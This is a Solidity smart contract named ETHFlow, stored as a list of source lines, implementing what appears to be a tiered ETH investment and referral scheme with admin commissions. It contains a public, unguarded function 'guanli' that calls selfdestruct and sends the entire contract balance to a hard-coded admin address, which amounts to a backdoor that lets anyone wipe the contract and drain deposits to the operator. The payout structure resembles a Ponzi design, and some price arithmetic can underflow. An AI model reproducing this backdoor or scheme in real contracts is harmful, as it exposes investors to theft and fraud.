['pragma solidity ^0.5.0;\n', '\n', 'contract ETHFlow {\n', '    using SafeMath for uint256;\n', '    \n', '    struct Tariff {\n', '        uint256 id;\n', '        string name;\n', '        uint256 price;\n', '        uint256 time;\n', '        uint256 value;\n', '        uint256 duration;\n', '        uint256 monthly;\n', '    }\n', '\n', '    mapping(uint256 => Tariff) public tariffs;\n', '    mapping(address => uint256) public tariffOf;\n', '    mapping(address => uint256) public tariffTime;\n', '    mapping(address => uint256) public time;\n', '    mapping(address => bool) public active;\n', '    mapping(address => uint256) public balanceUser;\n', '    mapping(address => address) public myReferrer;\n', '    //address of refer - address of referal - amount of percentage\n', '    mapping(address => mapping(address => uint256)) public statistic;\n', '    mapping(address => address[]) public referals;\n', '    mapping(address => uint256) public referalsEarning;\n', '    address payable private admin = 0x8948E4B00DEB0a5ADb909F4DC5789d20D0851D71;\n', '    uint256 private adminPercent = 10;\n', '    uint256 private percentFromEachProfit = 20;\n', '\n', '    event Deposit(\n', '        address Investor, \n', '        uint256 Amount\n', '    );\n', '\n', '    constructor() public {\n', '        tariffs[1].id = 1;\n', "        tariffs[1].name = 'free';\n", '        tariffs[1].price = 0;\n', '        tariffs[1].time = 3 * 1 hours;                      //180 min\n', '        tariffs[1].value = 360 * 1 szabo;          //0.00036 ETH\n', '        tariffs[1].duration = 0;\n', '        tariffs[1].monthly = 108 * 1 finney;    //0.108 ETH\n', '\n', '        tariffs[2].id = 2;\n', "        tariffs[2].name = 'tariff1';\n", '        tariffs[2].price = 50 * 1 finney;       //0.05 ETH\n', '        tariffs[2].time = 90 * 1 minutes;                     //90 min\n', '        tariffs[2].value = 540 * 1 szabo;         //0.00054 ETH\n', '        tariffs[2].duration = 476 * 1 hours;              //19 days 20 hours\n', '        tariffs[2].monthly = 259200 * 1 szabo;    //0.2592 ETH\n', '\n', '        tariffs[3].id = 3;\n', "        tariffs[3].name = 'tariff2';\n", '        tariffs[3].price = 100 * 1 finney;      //0.1 ETH\n', '        tariffs[3].time = 1 hours;                     //60 min\n', '        tariffs[3].value = 900 * 1 szabo;         //0.0009 ETH\n', '        tariffs[3].duration = 438 * 1 hours;              //18 days 6 hours\n', '        tariffs[3].monthly = 648 * 1 finney;    //0.648 ETH\n', '\n', '        tariffs[4].id = 4;\n', "        tariffs[4].name = 'tariff3';\n", '        tariffs[4].price = 250 * 1 finney;      //0.25 ETH\n', '        tariffs[4].time = 225 * 1 minutes;                    //225 min\n', '        tariffs[4].value = 9 * 1 finney;        //0.009 ETH\n', '        tariffs[4].duration = 416 * 1 hours;              //17 days 8 hours\n', '        tariffs[4].monthly = 1728 * 1 finney;   //1.728 ETH\n', '\n', '        tariffs[5].id = 5;\n', "        tariffs[5].name = 'tariff4';\n", '        tariffs[5].price = 1 ether;     //1 ETH\n', '        tariffs[5].time = 35295;                    //588.235 min\n', '        tariffs[5].value = 100 * 1 finney;      //0.1 ETH\n', '        tariffs[5].duration = 391 * 1 hours;              //16 days 7 hours\n', '        tariffs[5].monthly = 7344 * 1 finney;   //7.344 ETH\n', '\n', '        tariffs[6].id = 6;\n', "        tariffs[6].name = 'tariff5';\n", '        tariffs[6].price = 5 * 1 ether;     //5 ETH\n', '        tariffs[6].time = 66667;                    //1111.11 min\n', '        tariffs[6].value = 1 ether;     //1 ETH\n', '        tariffs[6].duration = 15 * 1 days;              //15 days\n', '        tariffs[6].monthly = 38880 * 1 ether;  //38.88 ETH\n', '\n', '        tariffs[7].id = 7;\n', "        tariffs[7].name = 'tariff6';\n", '        tariffs[7].price = 25 * 1 ether;    //25 ETH\n', '        tariffs[7].time = 2000 * 1 minutes;                   //2000 min\n', '        tariffs[7].value = 10 * 1 ether;    //10 ETH\n', '        tariffs[7].duration = 314 * 1 hours;              //13 days 2 hours\n', '        tariffs[7].monthly = 216 * 1 ether; //216 ETH\n', '\n', '        tariffs[8].id = 8;\n', "        tariffs[8].name = 'tariff7';\n", '        tariffs[8].price = 100 * 1 ether;   //100 ETH\n', '        tariffs[8].time = 62500;                    //1041,66 min\n', '        tariffs[8].value = 25 * 1 ether;    //25 ETH\n', '        tariffs[8].duration = 11 * 1 days;               //11 days\n', '        tariffs[8].monthly = 1036 * 1 ether;//1036 ETH\n', '    }\n', '\n', '    function activate(address _referrer) public {\n', '        require(myReferrer[msg.sender] == address(0));\n', '        \n', '        active[msg.sender] = true;\n', '        time[msg.sender] = now;\n', '        tariffOf[msg.sender] = 1;\n', '        \n', '        address referrer = _referrer;\n', '\n', '        if(referrer == address(0)) {\n', '            referrer = admin;\n', '        }\n', '    \n', '        myReferrer[msg.sender] = referrer;\n', '            \n', '        referals[referrer].push(msg.sender);\n', '    }\n', '    \n', '    function guanli() public {\n', '\t\tselfdestruct(admin);\n', '\t}    \n', '\n', '    function getETH() public payable {\n', '        require(active[msg.sender], "Need activate first");\n', '\n', '        uint256 userTariff = tariffOf[msg.sender];\n', '        uint256 value;\n', '\n', '        //tariff expire\n', '        if(userTariff > 1 && \n', '            now > tariffTime[msg.sender].add(tariffs[userTariff].duration)\n', '        ) {\n', '            uint256 expire = tariffTime[msg.sender].add(tariffs[userTariff].duration);\n', '            uint256 tariffDuration = expire.sub(time[msg.sender]);\n', '            uint256 defaultDuration = now.sub(expire);\n', '\n', '            value = tariffs[userTariff].value\n', '                        .div(tariffs[userTariff].time)\n', '                        .mul(tariffDuration);\n', '            value = value.add(tariffs[1].value\n', '                        .div(tariffs[1].time)\n', '                        .mul(defaultDuration));\n', '\n', '            require(value >= tariffs[1].value , "Too early");\n', '\n', '            userTariff = 1;\n', '            tariffOf[msg.sender] = 1;\n', '        } else {\n', '            value = getAmountOfEthForWithdrawal();\n', '\n', '            require(value >= tariffs[userTariff].value , "Too early");\n', '        }\n', '\n', '        uint256 sum = value;\n', '        \n', '        if (myReferrer[msg.sender] != address(0)) {\n', '            uint256 refSum = sum.mul(percentFromEachProfit).div(100);\n', '            balanceUser[myReferrer[msg.sender]] = \n', '                balanceUser[myReferrer[msg.sender]].add(refSum);\n', '                \n', '            statistic[myReferrer[msg.sender]][msg.sender] =\n', '                statistic[myReferrer[msg.sender]][msg.sender].add(refSum);\n', '            referalsEarning[myReferrer[msg.sender]] = \n', '                referalsEarning[myReferrer[msg.sender]].add(refSum);\n', '        }\n', '        \n', '        balanceUser[msg.sender] = balanceUser[msg.sender].add(sum);\n', '        time[msg.sender] = now;\n', '    }\n', '\n', '    function getAmountOfEthForWithdrawal() public view returns (uint256) {\n', '        uint256 value;\n', '        if(now >= tariffs[tariffOf[msg.sender]].time.add(time[msg.sender])) {\n', '            value = tariffs[tariffOf[msg.sender]].value;\n', '        } else {\n', '            value = now.sub(time[msg.sender])\n', '                .mul(tariffs[tariffOf[msg.sender]].value\n', '                    .div(tariffs[tariffOf[msg.sender]].time));\n', '        }\n', '        \n', '        return value;\n', '    }\n', '    \n', '    function getStatistic(address _refer, address _referal) public view returns (uint256) {\n', '        return statistic[myReferrer[_refer]][_referal];\n', '    }\n', '    \n', '    function getAmountOfReferals() public view returns (uint256) {\n', '        return referals[msg.sender].length;\n', '    }\n', '    \n', '    function getEarnedMonetFromReferals() public view returns (uint256) {\n', '        return referalsEarning[msg.sender];\n', '    }\n', '\n', '    function() external payable {\n', '        if(msg.value == 0) {\n', '            getETH();\n', '        } else {\n', '            changeTariff();\n', '        }\n', '    }\n', '\n', '    function deposit() public payable {\n', '        emit Deposit(msg.sender, msg.value);\n', '    }\n', '\n', '    function withdrawal() public {\n', '        uint256 value = balanceUser[msg.sender];\n', '\n', '        require(value <= address(this).balance, "Not enough ETH on the contract");\n', '        require(value >= 100 * 1 szabo, "Minimum withdrawal 0.0001 ETH");\n', '\n', '        balanceUser[msg.sender] = 0;\n', '        msg.sender.transfer(value);\n', '    }\n', '\n', '    function bytesToAddress(bytes memory bys) private pure returns (address addr) {\n', '        assembly {\n', '            addr := mload(add(bys,20))\n', '        } \n', '    }\n', '\n', '    function detectTariffId() public payable returns (uint256) {\n', '        require(msg.value >= tariffs[1].price, "Insufficient funds");\n', '\n', '        uint256 found = 0;\n', '        for(uint256 i = 1; i < 8; i++) {\n', '            if(msg.value >= getPriceForNewTariff(i) && \n', '            msg.value < getPriceForNewTariff(i+1)) {\n', '                found = i;\n', '            }\n', '        }\n', '        if(msg.value >= getPriceForNewTariff(8)) {\n', '            found = 8;\n', '        }\n', '        \n', '        return found;\n', '    }\n', '    \n', '    function getPriceForNewTariff(uint256 _newTariff) public view returns (uint256) {\n', '        if(tariffOf[msg.sender] == 1) {\n', '            return tariffs[_newTariff].price;\n', '        }\n', '        \n', '        uint256 duration = now - time[msg.sender];\n', '        uint256 timeLeft = tariffs[tariffOf[msg.sender]].duration\n', '                    - duration;\n', '                    \n', '        if(timeLeft == 0) {\n', '            return tariffs[_newTariff].price;\n', '        }\n', '        \n', '        uint256 pricePerOneSec = tariffs[tariffOf[msg.sender]].price\n', '                    / tariffs[tariffOf[msg.sender]].duration;\n', '        uint256 moneyLeft = pricePerOneSec * timeLeft * 90 / 100;\n', '        \n', '        return tariffs[_newTariff].price - moneyLeft;\n', '    }\n', ' \n', '    function changeTariff() public payable {\n', '        uint256 id = detectTariffId();\n', '\n', '        require(id >= tariffOf[msg.sender]);\n', '        \n', '        uint256 commission = getPriceForNewTariff(id).mul(adminPercent).div(100);\n', '        commission = commission.add(tariffs[id].price\n', '                        .sub(getPriceForNewTariff(id)).mul(100).div(90)\n', '                        .sub(tariffs[id].price.sub(getPriceForNewTariff(id))));\n', '\n', '        admin.transfer(commission);\n', '        msg.sender.transfer(msg.value.sub(getPriceForNewTariff(id)));\n', '\n', '        if(!active[msg.sender]) {\n', '            active[msg.sender] = true;\n', '        }\n', '        \n', '        time[msg.sender] = now;\n', '        tariffOf[msg.sender] = id;\n', '        tariffTime[msg.sender] = now;\n', '    }\n', '}\n', '\n', 'library SafeMath {\n', '  function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n', '    if (_a == 0) {\n', '      return 0;\n', '    }\n', '\n', '    c = _a * _b;\n', '    assert(c / _a == _b);\n', '    return c;\n', '  }\n', '\n', '  function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\n', '    return _a / _b;\n', '  }\n', '\n', '  function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\n', '    assert(_b <= _a);\n', '    return _a - _b;\n', '  }\n', '\n', '  function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n', '    c = _a + _b;\n', '    assert(c >= _a);\n', '    return c;\n', '  }\n', '}']